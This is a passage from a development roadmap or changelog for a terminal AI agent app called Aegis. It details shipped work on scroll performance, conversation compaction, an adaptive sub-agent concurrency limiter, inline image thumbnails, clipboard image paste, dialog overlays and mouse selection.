- Built-in-skills lists updated in `CLAUDE.md`, `docs/skills.md`, `docs/configuration.md`, and
  `docs/memory-and-knowledge.md`; `/research` row added to `docs/tui-guide.md`'s command table.
- No persona changes needed: `skill` is already in every non-debate-role persona's advisory
  `Tools` list (P13.7 follow-up), and `web_search`/`web_fetch` are already carried by 19 of the 22
  built-ins (all but the deliberately-minimal arbiter roles and the unrestricted `general`).

---

## Shipped — P18 items (TUI Streaming & Scroll Polish)

Three related complaints about the transcript pane during a streaming turn, requested and researched
2026-07-07 (see prior roadmap entry); implemented 2026-07-07 using three engineers working in
parallel git worktrees against the same diagnosis, then merged.

### P18.1 — DECIDED 2026-07-07 (no code change) — Extended-thinking display policy

Option (a) chosen: leave collapse-on-flush as the resting state (`m.thinkExpanded` still starts
`false` in `internal/tui/tui.go`, matching the "fold once done" convention TQ9 was built around)
rather than adding a config/session default to keep reasoning expanded through the whole turn. This
relies entirely on the P18.3 auto-follow fix below to make the *live*, not-yet-collapsed portion
trackable while it's being generated. `docs/tui-guide.md`'s existing "Extended Thinking Display"
section already accurately described this behavior, so no doc changes were needed either. Still
open: an interactive spot-check against a real terminal (unavailable in this dev environment, as in
every prior TUI session) to confirm the auto-follow fix alone is sufficient in practice; revisit
option (b) if it isn't.

### P18.2 — SHIPPED 2026-07-07 — Smooth scrolling (scrollbar/offset O(n) → O(1))

Profiled before fixing, per the roadmap's instruction not to guess. A benchmark (`internal/tui/
transcript_bench_test.go`) isolating each hot function found the actual per-tick cost wasn't in
per-item wrap caching or `View()`'s windowing (both already flat regardless of history size, per
P16.4) but in the scrollbar/percent path: `offsetLines()` (backing `ScrollbarThumb()`/
`ScrollPercent()`, called on every render via `renderScrollbar`) re-walked from segment 0 on every
call — cost proportional to scroll depth into history, not bounded to the visible window. A related
bug: `TotalHeight()`'s single cache was invalidated by every `SetTail` call, forcing a full
items+tail resum on each streamed token.

Fixed in `internal/tui/transcript.go`: split `TotalHeight()` into `itemsHeight()` (invalidated only
by structural mutations — append/trim/edit/resize) and the tail's already-cheap per-item cache, so a
streaming tail no longer forces a full resum; and made `offsetLines()`'s prefix sum maintained
*incrementally* by `ScrollBy`/`GotoTop`/`GotoBottom` as they move the offset, falling back to a full
recompute only on non-incremental jumps (`ScrollToItem`) or genuine invalidation. `GotoBottom`
deliberately does not derive its offset via `TotalHeight()` — that would force wrap-caching every
never-rendered item, breaking the existing O(visible) windowing guarantee (`TestTranscriptPaneViewIsWindowed`).

`BenchmarkScrollTick_WithScrollbar_NoTrimCap` (ns/op): 1,000 items 21,007→13,388; 10,000
28,501→15,327; 50,000 89,249→20,836; 200,000 331,060→12,601 — flat after the fix vs. clear linear
growth before. New `TestOffsetLinesCacheMatchesBruteForce`, a 400-step randomized differential test
comparing the incrementally-maintained prefix sum against a from-scratch computation across
scroll/append/resize/edit/jump sequences, backstops the incremental-cache correctness risk. `go vet`
and `go test -race ./internal/tui/...` both clean.

### P18.3 — SHIPPED 2026-07-07 — Auto-follow reliability + resume-on-return-to-bottom

Confirmed the code-read diagnosis: `internal/tui/tui.go`'s `eventMsg` case (fires for every streamed
token) always `return`s before reaching the second `switch`'s catch-all `m.followBottom =
m.transcript.AtBottom()` re-derivation, so once `followBottom` flipped `false`, nothing streamed by
`eventMsg` could re-arm it — only a subsequent `spinner.TickMsg` or an explicit user scroll-to-bottom
would. Fixed with one line re-deriving `m.followBottom = m.transcript.AtBottom()` *before*
`applyEvent` grows the content (checking after would always read `false` once new content outpaces
the still-unmoved viewport), mirroring what the tick/key/mouse paths already did; the existing P3.7
redraw-suppression guard is untouched.

New tests in `internal/tui/integration_test.go`: `TestFollowBottomStaysPinnedDuringEventStream_NoPTY`
(pinned at bottom across 20 streamed tokens while following) and
`TestFollowBottomResumesOnNextEvent_NoPTY` (scroll up clears `followBottom`; returning to bottom
mid-stream resumes on the very next `eventMsg`, not a spinner tick; a token arriving while genuinely
scrolled away does not force it back on). Verified as a real regression test by reverting the fix and
confirming the resume test fails, then restoring it. `go test -race ./internal/tui/...` clean.

Flagged, not fixed (pre-existing, unrelated): driving a real `tea.KeyMsg` through `model.Update`
while streaming hits a nil-client panic via `syncCompletion()` → `SlashDispatcher.Customs()` in a
client-less test model — the new tests route scroll input at the `transcriptPane` level directly to
avoid it.

---

## Shipped — P19 items (Docs & Session-Command Misc)

Two unrelated small items requested alongside P18 on 2026-07-07, grouped as a no-blocker bucket the
same way P13.3's leftovers were — not because they share a theme. Both shipped 2026-07-07.

### P19.1 — SHIPPED 2026-07-07 — Skill + companion-script authoring guide

`internal/skills` (bundled `SKILL.md` + companion assets like `internal/skills/builtin/
latex-report/analyze_sources.py` or `html-report/validate_report.py`) had no user-facing walkthrough
— `docs/extensibility.md` covered lifecycle hooks, MCP servers, custom commands/agents, process
plugins, and plugin bundles, but never mentioned skills at all, even though the mechanism
(frontmatter `name:`/`description:`, progressive disclosure via the `skill` tool, the generated
`<skill_assets>` manifest for bundled files, project vs. user vs. embedded-builtin precedence,
`aegis skills enable/disable`) was fully built and documented only in code comments. New
`docs/skills.md` (sibling to `docs/personas.md`/`docs/debate.md`, not folded into
`extensibility.md`, since skills are already their own documented subsystem in CLAUDE.md) covers: a
minimal single-file skill, a bundled directory skill with a companion script and how
`<skill_assets>` exposes it to the model, frontmatter fields, project/user/builtin precedence and
name collisions, and a worked example mirroring `html-report`.

Writing the guide surfaced two accuracy bugs in the existing docs, fixed in the same pass:
- `docs/memory-and-knowledge.md` documented the user-skills directory as `~/.local/share/aegis/
  skills/*.md`; the actual loader reads `~/.aegis/skills/*.md`.
- The documented memory-load order listed user skills before project skills; the real precedence
  (project shadows a same-named user skill) is the other way around.

`docs/README.md`'s doc-index table now links to `docs/skills.md`; `docs/memory-and-knowledge.md`'s
Skills section is slimmed to a quick reference plus a pointer to the full guide.

### P19.2 — SHIPPED 2026-07-07 — Manual `/compact` command

`internal/compaction` previously only ever triggered when a turn's estimated token count crossed
budget (`Summarizer.shouldCompact`); there was no way to force it early — e.g. before a long
tool-heavy stretch a user knows is coming. New `Summarizer.ForceCompact` (`internal/compaction/
compaction.go`) factors the existing `Compact` into a shared `compact(ctx, system, msgs, force
bool)` and runs the identical summarization pass — same stale-tool-result pre-pass, same
tool_use/tool_result-pairing-safe boundary selection — but skips both `shouldCompact` budget checks
when `force` is true, so it fires unconditionally rather than only near the context-window limit.

A new `POST /sessions/{id}/compact` daemon endpoint (`handleCompactSession`, `internal/server/
sessions.go`) type-asserts `s.compactor` to `*compaction.Summarizer` (returning 503 if no model
adapter is configured, so a nil compactor fails cleanly rather than panicking), serializes against
an in-flight run on the session via the same per-session semaphore `/rewind` already uses, calls
`ForceCompact`, and persists the result only if it actually changed the message list. `api.
CompactResponse` reports `Compacted`/`MessagesBefore`/`MessagesAfter`; a new `Client.Compact`
(`internal/client/client.go`) and TUI `/compact` command (`internal/tui/slash.go`,
`cmdCompact`) wire it end to end, reporting "nothing to compact" when the conversation is shorter
than `KeepRecent` messages rather than fabricating a summary out of almost nothing.

Confirmed no naming collision with the pre-existing `/tools compact` (`internal/tui/slash.go`,
`cmdTools`) — that's an unrelated `/tools` subcommand toggling tool-*output* display width, never
touching conversation history. `/compact` and `tools compact` are separate top-level entries in the
`commandDefs` dispatch table, resolved as distinct commands, not a shared string switch, so there is
no ambiguity in the palette or autocomplete.

Tested with new unit tests for `ForceCompact`'s two defining behaviors — ignoring the budget check
entirely and no-op'ing on a conversation too short to have a safe cut boundary — in `internal/
compaction/compaction_test.go`, plus server-level tests in `internal/server/
server_compact_test.go` exercising the full HTTP round-trip: a real multi-turn conversation
shrinking via `/compact`, a too-short conversation reporting `Compacted: false`, and the
no-compactor-configured 503 path.

---

## Shipped — P17 items (Adaptive Sub-Agent Concurrency)

Requested 2026-07-07, following a discussion of whether Aegis should offload research-style work to
sub-agents the way Claude Code's Task tool does. Conclusion of that discussion: the `agent` tool's
existing `parallel` workflow mode (`internal/tool/builtin/agent.go`) already covers the mechanism —
synchronous fan-out/fan-in, no polling — so there was nothing to build there. The real value for a
single local Ollama instance running one model isn't wall-clock speedup (concurrent requests against
one model server typically contend/serialize rather than parallelize the way cloud provider capacity
does) but **context isolation**: a sub-agent burns its own context digging through search results or
files and only a condensed summary returns to the parent, which is a win even with concurrency 1.
Given that, the old flat `maxParallelAgents = 8` upfront reject (unchanged, just renamed exported
`MaxParallelAgents`) was the wrong lever to tune by hand per host/model — this track added an
adaptive limiter, all 5 items shipped 2026-07-07:

- **P17.1 — Concurrency limiter primitive.** `internal/swarm/adaptive.go`'s `AdaptiveLimiter` wraps a
  mutex/`sync.Cond`-guarded `Acquire`/`Release` pair (not a fixed-size channel, since the cap changes
  at runtime). Floor 2, ceiling `MaxParallelAgents` (8), starts at the floor.
- **P17.2 — Bounded worker pool in parallel dispatch.** `executeWorkflow`'s `"parallel"` case in
  `agent.go` now has each spawn goroutine `Acquire` a limiter slot before calling `spawn()` and
  `Release` on completion (deferred), so agents beyond the current adaptive cap queue instead of all
  firing at once. The upfront `len(agents) > MaxParallelAgents` reject is untouched — still the hard
  ceiling on what one tool call may request; the limiter governs how many of those actually run
  simultaneously. Sequential/loop/debate modes were untouched, having at most one in-flight spawn by
  construction already.
- **P17.3 — Latency-based AIMD adjustment.** After each parallel batch, `AdaptiveLimiter.RecordBatch`
  computes `speedup = sum(individual spawn durations) / batch wall-clock elapsed` and compares it to
  the midpoint between fully-serial (1) and fully-concurrent (n) — `(1+n)/2` rather than `n/2`, since
  `n/2` degenerates at the floor (n=2 gives threshold 1, indistinguishable from fully serial).
  `speedup` above the midpoint raises the cap by 1 (up to the ceiling); at or below it halves the cap
  (down to the floor). Batches smaller than the current cap (`n < cap`) are ignored — they carry no
  concurrency signal. A spawn error consistent with resource exhaustion (`context.DeadlineExceeded`,
  or a message containing "connection refused"/"timeout"/"timed out"/"connection reset"/"too many
  requests") triggers the same halving via `RecordExhaustion`.
- **P17.4 — Daemon wiring and lifetime.** New `WithConcurrencyLimiter` `AgentToolOption`; `Server`
  gained an `agentLimiter *swarm.AdaptiveLimiter` field constructed once alongside `NewAgentTool` in
  `server.go` (both the full `NewServer` path and the lighter `newWithDeps` test constructor — the
  latter was missed on the first pass and caused a nil-pointer panic in `handleStatusInfo` under
  `go test`, caught immediately by the existing `TestServerStatusEndpoint` regression test rather than
  shipping broken). `NewAgentTool` falls back to a fresh floor-2 limiter when the option is omitted,
  so no pre-existing test call site (`agent_test.go`, `debate_agent_test.go`) needed to change.
  In-memory only, does not persist across restarts — re-converging from the floor costs only a couple
  of batches, a deliberate simplification.
- **P17.5 — Visibility.** `api.StatusInfo` gained `AgentConcurrency`/`AgentConcurrencyMax`, populated
  in `handleStatusInfo` and printed by the TUI's `/status` command, rather than a new endpoint or
  command (same fold-into-existing-surface precedent as P13.4.4/P14.5).

**Explicit non-goals (unchanged from the original scoping):** no VRAM/GPU/host introspection — Ollama
doesn't expose its own computed `OLLAMA_NUM_PARALLEL` concurrency via the API, so Aegis would be
reimplementing that heuristic blind from a fragile, platform-specific proxy signal; measuring actual
batch speedup is more direct and portable. No per-model or per-endpoint keying of the limiter — a
single process-wide limiter is sufficient while one daemon talks to one loaded model; revisit only if
P9.4 (per-task model routing) ships. No cross-restart persistence.

**Testing:** `internal/swarm/adaptive_test.go` — deterministic unit tests for every AIMD transition
(raise on high speedup, lower on low speedup, ignore batches smaller than the cap, ignore zero
wall-clock, clamp to `[2, 8]`, `RecordExhaustion`) using injected/synthetic `time.Duration` values,
no real sleeps; plus channel-synchronized (not sleep-based) tests that `Acquire`/`Release` actually
gate concurrency and that `Acquire` returns promptly on a cancelled context. `agent_test.go` gained
`TestAgentToolParallelWorkflowRespectsConcurrencyCap`, a `gatingBackend`-based integration test
confirming the real `parallel` dispatch path — not just the limiter in isolation — never lets more
than the floor (2) spawns run at once. All new tests pass under `-race`.

---

## Shipped — P16 items (TUI Polish & Interaction Parity)

The whole P16 track (P16.1–P16.9) is now shipped.

### P16.9 — SHIPPED 2026-07-07 — In-terminal image rendering

The gap: an attached image is sent to the model but never shown — the transcript only ever printed
a "(N images attached)" text notice. crush renders attachments inline; the roadmap item asked for
the same via kitty-graphics/iTerm2-inline-image protocols with a half-block fallback.

**Scope decision, made before writing any rendering code:** only the half-block fallback was
implemented. True kitty-graphics/iTerm2-inline-image protocol support was descoped. Both protocols
place image content via raw APC (`ESC _G ... ESC \`) or OSC (`ESC ]1337;File=... BEL`) escape
sequences that the *physical terminal* interprets at the moment they're written. But this TUI's
screen isn't written to directly — bubbletea v2 renders through `charmbracelet/ultraviolet`, a cell
grid that gets diffed and selectively redrawn every frame (streaming tokens, spinner ticks, cursor
blink all trigger redraws). Ultraviolet has no primitive for "this span is opaque, out-of-band
terminal state that must not be re-diffed or retransmitted" — the closest analogous case it *does*
solve, OSC 8 hyperlinks, gets first-class support via a `Cell.Link` field precisely because a
hyperlink is idempotent to re-emit and cheap. An image placement is neither: kitty's protocol
requires careful placement-ID and chunked-transmission bookkeeping to avoid duplicating or
re-uploading the image on every redraw, and there was no kitty or iTerm2 terminal available in this
environment to verify any of that behavior against. Shipping unverified raw-escape-sequence
injection into a TUI's redraw path — with a real risk of visible terminal corruption if the framing
is wrong — wasn't a responsible trade for a feature the roadmap itself flagged as "lowest priority
in the track — cosmetic." The half-block fallback carries none of that risk: it's ordinary
SGR-styled Unicode text, which ultraviolet already knows how to diff and redraw correctly. Richer
protocol support remains a candidate follow-up if/when it can be verified against real terminals.

**Implementation**, new `internal/tui/imagerender.go`:

- `detectImageProtocol(environ []string) imageProtocol` — reuses
  `charmbracelet/colorprofile.Env` (already an indirect dependency, promoted to direct) for its
  existing `NO_COLOR`/`CLICOLOR`/`TERM` handling rather than re-implementing terminal capability
  sniffing; returns `protocolHalfBlock` at ANSI256-or-better, `protocolNone` otherwise. Called once
  at TUI startup and cached on `model.imageProto`; a new `tui.image_rendering: auto|off` config key
  (default `auto`) can force it off.
- `thumbnailBox(w, h int) (cols, rows int)` fits the source image into a fixed 32×16-cell box
  (`cellAspect = 2.0` approximates a monospace cell's height:width pixel ratio), independent of the
  live transcript pane width — so a mid-session terminal resize never needs to re-lay-out an
  already-appended thumbnail.
- `resizeBoxAvg` downsamples via box averaging (every source pixel mapped into a destination cell is
  averaged), not nearest-neighbor — meaningfully less noisy than picking one sample pixel when
  shrinking a multi-megapixel photo to a few dozen cells, for about the same code.
- `renderHalfBlocks` renders the upper-half-block trick: each output row samples two source pixel
  rows, one becomes the cell's foreground color (`▀`), the other its background — doubling vertical
  resolution relative to one flat color per cell.
- `renderImageThumbnail` is the single best-effort entry point: any decode failure (corrupt data, or
  a format the stdlib `image` package can't decode — notably WebP, which has no stdlib decoder)
  returns `""` rather than an error, so callers transparently keep today's text-only notice instead
  of surfacing a rendering failure.

**Transcript integration** required one small architectural addition. `transcriptItem.rendered(w)`
normally pipes content through `wrap()` (`lipgloss.NewStyle().Width(w).Render(...)`) to reflow it to
the pane's current width — safe for prose, but a thumbnail's SGR-styled rows are already sized to a
fixed cell box and must reach the screen byte-for-byte. New `transcriptItem.noWrap` flag (set via
`newRawItem`/`transcriptPane.AppendRaw`) skips `wrap()` entirely while still participating in the
pane's normal per-item height caching, scroll math, and trim eviction — no changes needed anywhere
else in `transcript.go`.

Wired into both places an attachment can appear: `sendUserMessage` (live sends, reading the
attached file's bytes from disk via its resolved path) and `loadHistory` (session replay, decoding
the base64 `provider.ImageBlock.Data` already held in memory — no disk access needed). Both funnel
through `model.renderImageThumbnails`/`renderImageThumbnailsFromBlocks`, appended between the "You"
bar/text and the "Assistant" bar that follows (`appendUser` gained a `thumbnails []string`
parameter).

Tests: `internal/tui/imagerender_test.go` (protocol detection across dumb/ANSI/256-color/truecolor/
kitty `$TERM` combinations, `NO_COLOR`, box sizing edge cases including zero-size input, a decode
round-trip against a solid-color PNG fixture verifying exact SGR truecolor codes and a trailing
reset on every row, garbage-input decode failure, and the box-average resize's color purity across a
hard color boundary); `internal/tui/transcript_test.go` (`AppendRaw` bypasses `wrap()`, is a no-op
on empty input, and its rendered output is stable across a pane width change — the specific
regression `noWrap` exists to prevent); `internal/tui/image_thumbnail_integration_test.go` (a full
`sendUserMessage` call produces a `noWrap` transcript item with half-block styling when
`imageProto` is forced on, produces none when forced off, and the two `renderImageThumbnails*`
helpers degrade to `nil` — no panic — for an unreadable path or undecodable base64 data).

### P16.8 — SHIPPED 2026-07-07 — Clipboard image paste

The gap: `tea.PasteMsg` handling only recognized pasted *file paths* with an image extension (TQ9)
— pasting actual image bytes off the clipboard (the screenshot-then-paste workflow Claude Code and
crush both support) did nothing, because bracketed paste is a text-only terminal protocol; a
terminal has no way to forward binary clipboard image data through it even in principle. Reaching
the OS clipboard's image data at all requires bypassing the terminal's paste mechanism entirely and
talking to the platform clipboard API directly.

New `internal/tui/clipboard_image.go`, `pasteClipboardImage() (path string, ok bool, err error)`
dispatches per `runtime.GOOS` — the same per-OS split `copyToClipboard` already uses, since none of
the three platforms expose clipboard image access through the Go stdlib:

- **Windows:** `System.Windows.Forms.Clipboard.GetImage()` + `Bitmap.Save(..., ImageFormat.Png)` via
  a `powershell -Sta -Command` call (Clipboard/Bitmap access requires an STA thread; PowerShell
  defaults to MTA). Verified end-to-end against a real 4×4 test bitmap placed on the clipboard
  (round-tripped through `pasteClipboardImage` to a valid non-empty PNG file) and against clipboard
  *text* with no image present (correctly returns `ok=false`, no error).
- **macOS:** `pngpaste` (external tool, `brew install pngpaste`) — mirrors `copyToClipboard`'s Linux
  xclip/xsel/wl-copy pattern of requiring an installed tool rather than reimplementing NSPasteboard
  access; a missing-tool error names the install command.
- **Linux:** `wl-paste --type image/png` or `xclip -selection clipboard -t image/png -o`, whichever
  is on `PATH` (same preference order as `copyToClipboard`'s write side).

`ok=false, err=nil` (not an error) means the clipboard held no image — the caller shows an info
toast ("clipboard has no image") rather than an error one.

Wired to a new `ctrl+v` keybinding (`keyMap.PasteImage`) in the same `KeyMsg` switch arm as the
existing `ctrl+e` ($EDITOR) binding, and a `/paste-image` slash command (`SlashResult{Output:
"\x00paste-image"}`, same sentinel-string protocol `/copy` and `/sidebar` already use to hop from
the pure `slash.go` handler back into a `tui.go` `tea.Cmd`) for terminals that bind ctrl+v to their
own native paste before Aegis's `Update()` ever sees the keystroke. Both paths converge on
`pasteClipboardImageCmd()` → `pasteImageResultMsg`, which on success calls the *same*
`attachTokenFor`/`@image:` token path P16.8 was scoped to reuse (TQ9's `looksLikeImagePath`/
`extractImageRefs`) — so the daemon-side image-attachment handling (`buildImageBlocks` in
`internal/server/images.go`) needed no changes at all.

Tests: `internal/tui/clipboard_image_test.go` covers the OS-independent pieces
(`winSingleQuoteEscape`, `tempImagePath` uniqueness/cleanup, `commandExists`); the real
clipboard-reading paths were verified manually against a live Windows clipboard (both
image-present and no-image cases) rather than in the committed suite, since exercising an actual OS
clipboard isn't reproducible in CI — matching `copyToClipboard`'s own precedent of no automated
test for the real clipboard I/O.

### P16.6 — SHIPPED 2026-07-07 — Unified dialog overlay + shared filterable list component

The gap: six ad-hoc modal fields (`palette`, `personaPicker`, `sessionPicker`, `timelinePicker`,
`securityConfig`, `wizard`) each rendered full-screen via early returns in `render()` — no layering
over the dimmed chat, and the four list-backed pickers each re-implemented an almost identical
`Update`/`View` around a `bubbles/list.Model` (already sharing `aegisListDelegate`/
`configureDialogList`/`dialogFrame` chrome, but not the surrounding type).

**(b) One shared filterable-list component.** New `listDialog` (`internal/tui/dialog.go`) replaces
the four near-identical types (`paletteModel`, `personaPickerModel`, `sessionPickerModel`,
`timelinePickerModel`) with one, tagged by a `dialogKind` enum (`dialogPalette`/
`dialogPersonaPicker`/`dialogSessionPicker`/`dialogTimelinePicker`/`dialogModelPicker`). Selection/
cancel are generic messages (`dialogSelectedMsg{kind, item list.Item}` / `dialogCancelMsg{kind}`);
each item type (`paletteItem`, `personaItem`, etc.) still owns its own `FilterValue`/`Title`/
`Description`, and the model's `Update` has a single dialog-routing block with a `switch kind`
instead of four separate near-duplicate blocks — same for the four construction call sites and the
four `View()` branches. `model.dialog *listDialog` replaces the four separate pointer fields.

**(a) Real compositing instead of full-screen replacement.** New `renderOverlay(bg, fg, w, h)`
uses lipgloss v2's `Layer`/`Compositor`/`Canvas` (backed by `charmbracelet/ultraviolet`, previously
only an indirect dependency) to draw the dialog centered over the *actual* rendered chat frame
rather than a blank background, then `dimOutside` walks the canvas's cells outside the dialog's
rectangle and sets the terminal "faint" attribute on each (`uv.AttrFaint`) so the dialog reads as
foreground against a visibly receded chat — a real dim, not a `lipgloss.Style` wrapper (which
can't reliably override colors already baked into the chat's ANSI spans). `render()` now builds the
chat frame once (extracted into `renderChat()`) and layers whichever of help/quit-confirm/dialog is
open on top via `renderOverlay`; `renderHelpOverlay` split into `renderHelpBox` (content only) for
the same reason. The wizard and security-config dialogs deliberately keep replacing the frame
outright — they're large multi-step forms where full-screen still reads as the right choice, not an
ad-hoc gap — so this item's compositing covers the four pickers, the model picker below, help, and
quit-confirm, not all six original modal fields.

**New: model picker.** `/models` (previously a bare "current model + mode" printout) now opens an
interactive picker (`internal/tui/modelpicker.go`) over `internal/modelcatalog`'s existing curated
list, sorted by provider with the session's current model marked (`●` prefix) and pinned first in
its group; a model not in the catalog (a custom override) gets its own synthetic "current (custom)"
entry so the picker always reflects what's active. Selecting an entry dispatches through the
existing `/model <id>` command — same path as typing it — rather than duplicating the switch logic.
`/model <id>` and bare `/model` (prints the current model without opening anything) are unchanged
and still covered by their existing test. Fixed a small latent gap while wiring this up: a
successful `/model` switch updated the daemon-side per-session override but never touched
`m.cfg.Model` (the TUI's own display copy driving the title bar, sidebar, and context-window sizing)
— `SlashResult` gained a `Model *string` field, set on a successful switch (not on `/model default`,
which stays a pre-existing, unworsened gap), that `slashResultMsg` handling now applies.

**New: quit confirmation while streaming.** `/quit`/`/exit` used to cancel an in-flight stream and
exit unconditionally, silently discarding a response mid-generation. `slashResultMsg{Quit: true}`
now opens a `quitConfirm` overlay (`internal/tui/quitconfirm.go`) instead, when `m.streaming` — y/
enter confirms (cancels the run, saves the draft stash, quits), n/esc backs out. Quitting when
nothing is streaming is unchanged (nothing at risk, no reason to ask). `ctrl+c`'s own double-tap
interrupt-then-quit behavior was not touched — it already avoided quitting mid-stream by cancelling
the run on the first press.

Tests: new `internal/tui/dialog_test.go` — `listDialog` select/cancel round-trip through the real
`tea.Cmd` messages, `renderOverlay` proves the composited frame still contains chat content behind
the dialog (not just the dialog on a blank background), `dimOutside` leaves the dialog's own
rectangle untouched, quit-confirm gates a streaming quit but not an idle one, and the model picker's
provider grouping/current-marking/synthetic-entry logic. All prior dialog/picker tests
(`palette`/persona/session/timeline call sites, `/model` bare-args) pass unmodified.

### P16.4 — SHIPPED 2026-07-07 — Transcript as a cached per-message item list

The gap: the transcript was one big string re-joined into a `bubbles/viewport` on every refresh.
Per-block wrap caching (TQ1) kept resize/redraw cheap, but the monolith blocked per-message
interaction (no way to address "the 40th message" without re-deriving it from a byte offset) and
had no path to mouse hit-testing.

New `internal/tui/transcript.go` model, replacing both `transcript` (content) and
`bubbles/viewport.Model` (scroll/display) with one type:

- **`transcriptItem`** — same role as the old `transcriptBlock` (one independently-wrapped,
  independently-cached unit: a user turn, assistant reply, tool call/result, system notice), plus a
  cached line-height (`cacheHeight`, `strings.Count` of the wrapped output) so scroll math never
  needs to split a string into a line slice just to count it.
- **`transcriptPane`** — the virtualized list itself (crush's `internal/ui/list/list.go` model).
  Content is addressed as **segments**: the non-evictable trim marker (if any), the real items in
  order, then an ephemeral trailing "tail" segment for streaming preview text (rebuilt every
  `refresh()`, never cached or evictable). Scroll position is `(offsetIdx, offsetLine)` — a segment
  index plus a line offset within it — rather than a flat byte/line offset, which is what makes
  both `ScrollToItem` and an O(visible) `View()` possible.
- **`View()`** walks segments from the current offset, accumulating only enough wrapped content to
  fill the viewport height, then slices exactly the visible lines out of that bounded buffer — cost
  is O(segments touching the viewport), not O(total transcript). Reuses each item's whole-string
  wrap cache rather than a per-item line-slice cache, relying on the pre-existing invariant that
  every item's raw content ends on a line boundary.
- **`ScrollToItem(idx)`** replaces the timeline picker's old `renderUpTo(idx, width)` +
  `SetYOffset(strings.Count(prefix, "\n"))` dance (re-wrapping every item up to the target on every
  seek) with an O(1) segment-index set.
- **`HandleKey`/`HandleMouseWheel`** reproduce `bubbles/viewport`'s default scroll keymap and wheel
  delta (3 lines/notch) exactly, so removing the dependency changed no observable scroll behavior.
- **`ItemIndexAtY(y)`** — line→message hit-testing ported from crush's `findItemAtY`
  (`list.go:880-908`). Not wired to any input handling yet — nothing calls it — but implemented and
  covered by tests now while the windowing code is fresh in mind. This is the seam **P16.5** (mouse
  selection/click) consumes.

`tui.go`/`approval.go` updated every `m.vp.*` call site to the equivalent `m.transcript.*` method
(`Append`/`Reset`/`Width`/`Height`/`AtBottom`/`ScrollPercent`/`TotalLineCount`); the `viewport`
import is gone from `tui.go` entirely. `ultraviolet` adoption (the roadmap's optional follow-on) was
not needed — the segment/cache model above was sufficient on its own.

Tests: `transcript_test.go` rewritten against the new `Append`/`View`/`HandleKey`/`ItemIndexAtY`
API (including a `testKeyMsg` helper building `tea.KeyPressMsg`s for the fixed set of keys
`HandleKey` matches); `integration_test.go`'s timeline-seek test now asserts `ScrollToItem` +
`View()` lands exactly on the target turn's own content instead of checking a rendered prefix
string.

### P16.5 — SHIPPED 2026-07-07 — Mouse selection, click interactions, and scrollbar

The gap: `MouseModeCellMotion` was enabled but nothing handled `tea.MouseMsg` — only the
viewport's built-in wheel scroll did anything. Alt-screen + mouse mode disables the terminal's own
native text selection, so enabling mouse mode without offering a replacement made copy/paste
*worse* than not enabling it at all (shift-click still worked, but that's not discoverable).

New `internal/tui/selection.go`, plus a `sel selection` / `focusedIdx int` pair added to `model`:

- **Coordinate translation.** `tea.Mouse` reports terminal-absolute X/Y; `paneOrigin()` /
  `toPaneCoord()` / `clampPaneCoord()` convert that into transcript-pane-relative row/col,
  accounting for the 1-row title bar, the 1-col `PaddingLeft` on the transcript, and the sidebar's
  width when open. Selection state itself is kept in this screen space — not mapped onto persistent
  item/offset coordinates — which matches how a real terminal's native selection behaves (it
  doesn't survive a scroll mid-drag either) and is far simpler than threading selection through the
  virtualized item model from P16.4.
- **Drag selection.** `tea.MouseClickMsg` arms a selection (`sel.active = true`) at the clicked
  cell; `tea.MouseMotionMsg` (only delivered while a button is held, under cell-motion mode) moves
  the far end; `tea.MouseReleaseMsg` finalizes it and — if the anchor and release cells differ —
  extracts the covered text via `selectedText()` (ANSI-aware via `ansi.Cut`, so styled transcript
  content copies as plain text) and copies it with the existing `copyToClipboardCmd` (the native
  per-OS clipboard path; there is no OSC-52 path in the codebase to reuse, unlike what the original
  roadmap wording implied).
- **Double-click / triple-click.** `registerClick()` tracks a same-cell click count within a
  400ms window, wrapping back to 1 after a third click. Double-click selects the word under the
  cursor (`wordBounds()` — letters/digits/`_` are word runes, lone punctuation is its own
  single-char word, whitespace is its own single-char word) and copies it immediately; triple-click
  selects and copies the entire rendered line.
- **Click-to-focus.** Any left click sets `focusedIdx` to `transcript.ItemIndexAtY(row)` — the
  P16.4 seam this item was built to consume. Purely a visual affordance (a left accent bar drawn
  over column 0 in `renderTranscriptContent`, done by overwriting the column rather than prepending
  and shifting the rest of the line right, so wrap width and later `lipgloss.JoinHorizontal`
  composition stay untouched); it gates no other behavior.
- **Scrollbar.** `transcriptPane.ScrollbarThumb()` (new) returns the thumb's `[start, end)` row
  range sized proportionally to the visible fraction of total content, backed by a new
  `offsetLines()` helper factored out of `ScrollPercent()` so the two can't drift apart.
  `renderScrollbar()` draws it as a `┃`/`│` glyph column to the right of the transcript
  (`layout()` reserves one column for it); the title bar's old "62% ·" text is gone — `renderTitleBar`
  now renders just the model name on the right.
- **`VisibleLines()`** (new, on `transcriptPane`) splits the current `View()` into per-row ANSI
  strings once, reused by both the selection overlay and the scrollbar/focus-bar renderers instead
  of re-deriving rows from `View()` repeatedly.

Two deliberate narrowings from the roadmap item's original wording, called out so the docs stay
accurate: no OSC-52 clipboard path exists anywhere in the codebase (only the native per-OS
`copyToClipboard` tool path, which is what's reused), and there is no Esc-key clearing of an active
selection or focused item — left out to avoid touching the already carefully-tuned double-tap
ESC/interrupt handling elsewhere in `Update()`.

`tui.go`: `Update()`'s message-type switch gained `tea.MouseClickMsg` / `tea.MouseMotionMsg` /
`tea.MouseReleaseMsg` cases dispatching to `handleMouseClick`/`handleMouseMotion`/
`handleMouseRelease`; `render()` composes `renderTranscriptContent()` and `renderScrollbar()`
side by side via `lipgloss.JoinHorizontal` instead of rendering `transcript.View()` directly.

Tests: new `internal/tui/selection_test.go` covers `wordBounds`, `selectedText` (single/multi-row,
out-of-range clamping), `registerClick` counting/timeout/wraparound, the pane-coordinate geometry,
and each handler (single-click focus+arm, drag+release copy, no-drag release copies nothing,
double-click word select, triple-click line select, non-left-button and outside-pane clicks
ignored) — plus two tests that drive the same click/drag/release and wheel-scroll sequences
through the real `Update()` dispatch rather than calling the handlers directly, so the
`tea.MouseClickMsg`/`tea.MouseMotionMsg`/`tea.MouseReleaseMsg`/`tea.MouseWheelMsg` wiring itself is
covered, not just the handler logic. `transcript_test.go` gained coverage for `ScrollbarThumb`
(no-thumb-when-content-fits, thumb tracks top/bottom scroll position) and `VisibleLines` (matches
`View()` when split on `\n`).

### P16.7 — SHIPPED 2026-07-07 — Runtime-loadable themes

The gap: only two hardcoded schemes (dark/light) existed, versus opencode's ~30 JSON theme assets
plus user themes. `colorscheme.go` already centralized every color the TUI uses, so the missing
piece was a loader, not a redesign.

New `internal/tui/theme_loader.go`:

- **`themeFile`** — a JSON schema of background/foreground plus the standard 16-color ANSI
